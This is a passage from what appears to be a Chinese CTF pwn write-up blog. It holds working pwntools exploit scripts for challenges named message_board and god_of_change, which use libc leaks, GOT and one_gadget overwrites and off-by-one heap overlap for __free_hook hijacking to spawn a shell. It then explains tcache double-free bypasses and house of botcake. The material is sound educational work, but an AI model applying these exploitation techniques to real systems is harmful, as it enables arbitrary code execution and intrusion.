class="number">24</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libcbase = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x51000</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x50000</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-message-board"><a href="#0x04-message-board" class="headerlink" title="0x04 message_board"></a>0x04 message_board</h3><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><p>附件给出了libc2.31的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  board();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can modify your suggestions&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input new suggestion&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    a[v4] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>board函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (**board())(<span class="type">const</span> <span class="type">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> (**result)(<span class="type">const</span> <span class="type">char</span> *); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-9Ch] BYREF</span></span><br><span class="line">  __int64 v2[<span class="number">18</span>]; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you have any suggestions for us&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2[i + <span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your suggestion is %ld\n&quot;</span>, v2[i + <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please enter the verification code&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v2);</span><br><span class="line">  result = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span> (**)(<span class="type">const</span> <span class="type">char</span> *))v2[<span class="number">0</span>] != &amp;<span class="built_in">puts</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>主函数没有return，board函数的return也没法利用，所以肯定不是ROP。看到主函数里有一个自定义数组索引的输入，很容易想到数组越界。一看a数组刚好在bss段，所以可以利用数组越界修改exit的got表为one_gadget来getshell，偏移为-28。这里需要注意一个问题是，a数组储存的数据类型是dd（DWORD），也就是四个字节，所以写libc地址的时候需要分两次写到-28和-27偏移。不用system的原因是一个是没必要，第二也没地方写binsh。</p><p>在数组越界之前，在board函数里需要绕过一个“认证”，它要求我们输入puts的libc地址，这也就要求我们泄露libc地址。这里有个知识点，scanf无返回特性，利用这个特性我们可以结合printf打印出留存在栈上的libc地址，从而通过检查，进行数组越界。下面我们讲讲这个特性。</p><h5 id="scanf无返回特性"><a href="#scanf无返回特性" class="headerlink" title="scanf无返回特性"></a>scanf无返回特性</h5><p>这个特性比较有意思。众所周知，scanf只会接收格式化字符串指定的数据，那不符合的那些输入怎么办？答案是拒之门外或者扔掉。举个例子，如果他原本要接收%d的数据，结果你输入了123abc，那它会只接收123，而abc还存在stdin中；如果输入了超出了int范围的数字就会高位截断，也就是我们常说的整数溢出；如果直接输入字母，那么他不接收任何东西，如果原本变量上已经初始化了一个值，那么这个值依然不会变，但是如果接下来有多个scanf，程序会直接全部跳过；如果输入的是单独一个‘+’或‘-’，因为这两个字符对于int来说是合法的，但是又不存在数字，所以scanf选择接收，但是不会改变变量的值。综上所述，我们只要在scanf输入加号减号就可以跳过一次输入，并且不影响下面的输入。关于scanf其他特性，可以去看C0Lin师傅的总结：<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">以PWN视角看待C函数——scanf</a>。</p><p>我们看回到这道题，我们要尝试打印libc地址，栈上一般都会有libc地址留存，但是如果我们输入东西肯定会覆盖掉原本的内容，所以就需要用加减号绕过。我们先来看看原本board函数栈上的布局：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/message_board%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="message_board栈布局"></p><p>v2数组从rbp-0x98（0008处）开始，所以v2[2]就是一个libc地址，所以我们只要绕过2条建议的scanf就可以拿到libc地址了。</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27152</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./message_board&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">libc_stderr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_stderr))</span><br><span class="line">libcbase = libc_stderr-libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libc_puts = libcbase+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>((libc_puts)))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;code\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_puts).encode())</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">libc_one = p64(one[<span class="number">1</span>]+libcbase)</span><br><span class="line">one_l = u32(libc_one[:<span class="number">4</span>])</span><br><span class="line">one_h = u32(libc_one[<span class="number">4</span>:])</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">28</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_l).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">27</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_h).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-god-of-change"><a href="#0x05-god-of-change" class="headerlink" title="0x05 god_of_change"></a>0x05 god_of_change</h3><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>菜单堆题，有add，delete和show三个功能，其中add中写content的时候存在off by one的漏洞，自然而然想到劫持size字段造成overlapping。接触了这么多堆题，不难发现，提前规划堆布局很重要，所以先来考虑getshell的方式。最简单直接的getshell方式就是劫持__free_hook执行system函数，前提是知道libc基址。这道题开了PIE，所以很难通过got表来打印出libc地址，但是slot的数量上限是32个，每个slot大小最大是0x7F，所以可以考虑通过unsortedbin来泄露libc地址。所以这道题最重要的布局其实是对于泄露libc地址进行的。</p><h5 id="利用Unsortedbin泄露libc地址"><a href="#利用Unsortedbin泄露libc地址" class="headerlink" title="利用Unsortedbin泄露libc地址"></a>利用Unsortedbin泄露libc地址</h5><p>Unsortedbin由一个循环链表来维护，如下图所示：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表（from xswlhhh）"></p><p>而main_arena其实是一个libc地址，他在libc中与__malloc_hook函数有着固定的偏移，一般是0x10，如果有libc附件，我们就可以轻松得到libc基址。问题在于我们如何获取main_arena的地址。显然链表头（最后一个chunk）的fd和链表尾的bk（第一个chunk）都指向main_arena，如果我们能够free掉这两个chunk其中之一后依然能够打印chunk内容，我们就获得了libc地址。</p><h5 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h5><p>首先要先想办法把一个chunk放进unsortedbin中。程序中限制了申请的size不超过127，所以只能通过off by one来修改size。想要放进unsortedbin中至少要超过0x400的大小绕过tcachebin并且不能和top chunk相邻。由于每次只能改一个字节，所以需要通过chunk0修改chunk1，通过chunk1覆盖chunk2的头去改掉chunk2的size。这时候释放掉chunk2就能进unsortedbin。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%BF%9B%E5%85%A5unsortedbin.png" alt="god_of_change进入unsortedbin"></p><p>如上图会发现我还申请了很多0x80大小的chunk，是因为我需要防止修改完size的chunk2和topchunk相邻。如果相邻，那么free之后会直接被topchunk合并。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%ABtopchunk%E5%90%88%E5%B9%B6.png" alt="god_of_change被topchunk合并"></p><p>接下来申请一个0x40大小的chunk，它会从chunk2中被切割下来，剩下那部分依然存在unsortedbin中。此时unsortedbin中只有一个chunk，所以他的fd和bk都是main_arena的地址。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%89%93%E5%8D%B0libc%E6%97%B6%E7%9A%84%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change打印libc时的堆布局"></p><p>可以看到这个地址和main_arena的偏移是0x60，所以libc的基址是泄露的地址-0x70-__malloc_hook的偏移。</p><p>接下来要劫持__free_hook为system的地址，并且要提前写入&#x2F;bin&#x2F;sh。思路是修改一个chunk的fd为hook的地址，然后申请一个相同大小的chunk就能申请到hook，然后修改其为system地址，然后立刻释放掉写有&#x2F;bin&#x2F;sh的chunk就getshell了。</p><p>我们先申请多一个0x40（总之是chunk2要一样的大小）大小的chunk，然后释放掉（chunk3）放入tcachebin中，后面用来申请到hook位置。然后释放掉之前申请的chunk2和chunk1。此时chunk1的一部分和chunk2是重叠的，所以申请chunk1大小的chunk就可以修改chunk2的fd，顺便在user_data开始处写sh，别忘了不要覆盖了chunk2的size字段。然后申请两个chunk2大小的chunk，第二个chunk就在hook地址，修改掉其指针为system。然后释放掉chunk1就getshell了。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%9C%80%E5%90%8E%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change最后堆布局"></p><p>通过debug找到hook的地址确认劫持成功：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%AB%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84hook.png" alt="god_of_change被修改后的hook"></p><p>但是毕竟是patch过libc的可能libc的加载地址还是不太一样（上面libc地址一片空白我就觉得很奇怪了），在本地打不通，所以直接在线环境去尝试一下，是能通的。</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./god_of_change&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 25861)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;deadbeef&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x61</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0x441</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content: \n&#x27;</span>)</span><br><span class="line"><span class="comment"># print(r.recvuntil(b&#x27;\x7f&#x27;))</span></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - \</span><br><span class="line">    <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, flat(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x41</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Heap Exploitation』tcache_attack</title>
      <link href="/2024/tcache-attack/"/>
      <url>/2024/tcache-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="TcacheBin-Attack"><a href="#TcacheBin-Attack" class="headerlink" title="TcacheBin Attack"></a>TcacheBin Attack</h2><p>根据源代码我们可以得知，高版本的glibc给tcachebin引入了检查机制，使得攻击没那么方便了，但正所谓道高一尺魔高一丈，没有攻不破的系统，只有不努力的黑客。tcache的检查机制主要有两个：对double free的检查和对chunk对齐的检查。前者的分析见<a href="https://c-lby.github.io/2024/02/14/glibc_tcachebin/#TcacheBin%E5%AD%98%E5%8F%96chunk">TcacheBin存取chunk</a>。这里对chunk对齐的机制进行溯源。</p><h3 id="chunk对齐检查机制"><a href="#chunk对齐检查机制" class="headerlink" title="chunk对齐检查机制"></a>chunk对齐检查机制</h3><p>tcache通过aligned_OK(e)函数来检查chunk对齐。在malloc.c第1322行有宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>然后在sysdeps&#x2F;generic&#x2F;malloc-size.h里可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>在malloc-alignment.h里有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc&#x27;ed chunks.  It must be a power of two at least 2 * SIZE_SZ, even on machines for which smaller alignments would suffice. It may be defined as larger than this though. Note however that code and data structures are optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="meta">  ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>alignof函数就不看了，这里基本上可以看出来chunk的对齐要求是2*SIZE_SZ的倍数，在64位中具体是32的倍数。需要注意的是这里检查的地址是mem的地址而不是chunk的地址。所以在利用的时候，比如劫持chunk的fd进行任意地址读写时，要挑选符合对齐要求的地址。在2.31及之前的glibc版本不需要进行检查。</p><p>检查代码参考：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span>* target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>地址对齐检查机制是从2.32版本开始的。</p><h3 id="double-free中key的绕过"><a href="#double-free中key的绕过" class="headerlink" title="double free中key的绕过"></a>double free中key的绕过</h3><h4 id="方法一：破坏key"><a href="#方法一：破坏key" class="headerlink" title="方法一：破坏key"></a>方法一：破坏key</h4><p>空闲chunk进入tcache时会被赋予key，从tcache取出时会被置空，以此区分该chunk是否在tcache中。如果程序中存在UAF漏洞或者堆溢出漏洞，我们就可以将key位置置空或者换个数字，这样就可以直接绕过_int_free的第一个if判断，下面的count和对齐检查直接跳过。</p><h4 id="方法二：劫持size"><a href="#方法二：劫持size" class="headerlink" title="方法二：劫持size"></a>方法二：劫持size</h4><p>tcache会根据chunk的size来计算bin索引，而chunk只会在对应的bin内进行比较。如果在第一次释放victim后，利用uaf或者溢出修改victim的size，那么第二次释放的时候_int_free就会去检查修改后的索引对应的bin里有没有victim，从而绕过了检查。</p><h4 id="方法三：利用fastbin"><a href="#方法三：利用fastbin" class="headerlink" title="方法三：利用fastbin"></a>方法三：利用fastbin</h4><p>假如现在我们希望可以double free victim这个内存块，那么我们可以先申请7个和victim一样大的内存块，然后将它们全部释放以填满tcache中对应的那条bin，这时候再释放掉victim就可以使其进入fastbin。<br>这时候申请一个一样大的内存块，因为tcache的优先级大于fastbin，这个chunk会从tcachebin里取，而bin中只有6个chunk且不包含victim，这时可以对victim进行第二次释放就可以使它同时存在于tcachebin和fastbin。<br>其实也可以直接填满tcachebin之后，直接在fastbin里进行double free，因为fastbin只会对链表头部的chunk进行检查，相对比较好绕过，只需要在两次释放中间释放一个无关chunk就行。当然这受限于程序允许我们创建的chunk个数。</p><h4 id="方法四：house-of-botcake"><a href="#方法四：house-of-botcake" class="headerlink" title="方法四：house of botcake"></a>方法四：house of botcake</h4><p>这个方法和上一个方法有点像，但是是利用unsortedbin来实现。fastbin只能存0x80以下大小的chunk，并且想要取出来的话，需要先把tcachebin中的chunk取完才能轮得到fastbin，在一些自定义堆分配的菜单题里不太好用。利用过程如下:</p><ul><li>申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C</li><li>释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin</li><li>释放 chunk B，则 chunk B 会和 chunk A 合并</li><li>申请一个与前七个一样大的chunk，空出一个位置来</li><li>再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin</li><li>利用时，修改完chunk B的fd指针之后，只需要申请一块稍微比chunk B大一点点的内存，就能把我们想要进行读写操作的地址malloc出来了。</li></ul><h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><h4 id="tcache-poisoning-from-How2Heap"><a href="#tcache-poisoning-from-How2Heap" class="headerlink" title="tcache poisoning from How2Heap"></a>tcache poisoning from How2Heap</h4><h5 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 